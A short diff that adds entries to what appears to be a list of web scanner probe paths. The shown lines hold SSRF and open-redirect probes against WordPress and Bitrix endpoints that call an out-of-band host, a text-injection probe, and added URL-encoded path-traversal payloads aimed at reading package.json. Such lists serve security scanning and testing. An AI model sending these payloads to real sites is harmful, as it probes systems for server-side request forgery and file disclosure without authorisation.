@@ -140,3 +140,6 @@
 /wp-content/plugins/wordpress-toolbar/toolbar.php?wptbto=https://oast.me&wptbhash=acme
 /wp-admin/admin.php?page=wc-settings&action=redirect_telcell_form&api_url=https://oast.me
 /bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=https://google.com
+/v1/avatars/favicon?url=http://{{interactsh-url}}
+/assets/built%2F..%2F..%2F/package.json
+/assets/built%2F..%2F..%2F%E0%A4%A/package.json
